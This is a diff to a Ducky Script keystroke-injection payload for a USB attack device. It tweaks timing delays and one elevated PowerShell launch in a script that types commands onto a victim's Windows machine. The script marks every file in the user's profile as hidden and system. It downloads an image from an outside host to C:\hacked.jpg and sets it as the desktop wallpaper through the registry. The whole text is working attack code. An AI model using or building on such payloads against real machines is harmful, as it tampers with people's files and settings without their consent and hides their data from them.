@@ -13,7 +13,7 @@ GUI r
 DELAY 350
 STRING powershell
 CTRL-SHIFT ENTER
-DELAY 350
+DELAY 1000
 
 REM --Start Powershell With Modified Window's Height & Width to 1 & Exit Current Shell--
 
@@ -32,18 +32,20 @@ STRING cd C:\Users\$env:UserName
 ENTER
 STRING attrib +s +h /s /d *; exit
 ENTER
-
+DELAY 1000
 REM --Download Image And Set It As Background--
 
 GUI r
 DELAY 350
 STRING powershell
-CTRL-SHIFT ENTER
-DELAY 350
+ENTER
+DELAY 600
 STRING Invoke-WebRequest -Uri https://i.pinimg.com/originals/c1/50/7d/c1507daacebab64368d98d3e71e13661.jpg -OutFile C:\hacked.jpg
 ENTER
+DELAY 350
 STRING Set-ItemProperty -Path "HKCU:Control Panel\Desktop" -Name WallPaper -Value C:\hacked.jpg
 ENTER
+DELAY 350
 STRING rundll32.exe user32.dll, UpdatePerUserSystemParameters 0, True; exit
 ENTER
 GUI d
